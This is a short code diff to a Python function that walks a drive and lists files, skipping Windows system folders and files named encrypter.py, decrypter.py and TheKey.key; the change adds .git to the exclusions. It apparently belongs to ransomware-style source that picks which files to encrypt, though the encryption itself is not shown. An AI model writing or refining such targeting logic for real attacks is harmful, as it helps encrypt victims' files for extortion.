@@ -29,7 +29,8 @@ def get_all_files(root_dir):
         "$Recycle.Bin", "System Volume Information", "Boot", "Fonts", "Logs",
         "PolicyDefinitions", "Prefetch", "System", "config", "drivers",
         "DriverStore", "Logfiles", "spool", "SysWOW64", "Temp", "WinSxS",
-        "Common Files", "Default User", "Default", "Public", "Program Files (x86)"
+        "Common Files", "Default User", "Default", "Public", "Program Files (x86)",
+        ".git"
         ]
     for dirpath, dirnames, filenames in os.walk(root_dir):
         #Exclude some directories
@@ -37,7 +38,7 @@ def get_all_files(root_dir):
 
         for filename in filenames:
             full_path = os.path.join(dirpath, filename)
-            if full_path.endswith(("decrypter.py", "encrypter.py", "TheKey.key", "NTUSER.DAT")):
+            if full_path.endswith(("decrypter.py", "encrypter.py", "TheKey.key", "NTUSER.DAT", ".git")):
                 continue
             all_files.append(full_path)
     return all_files
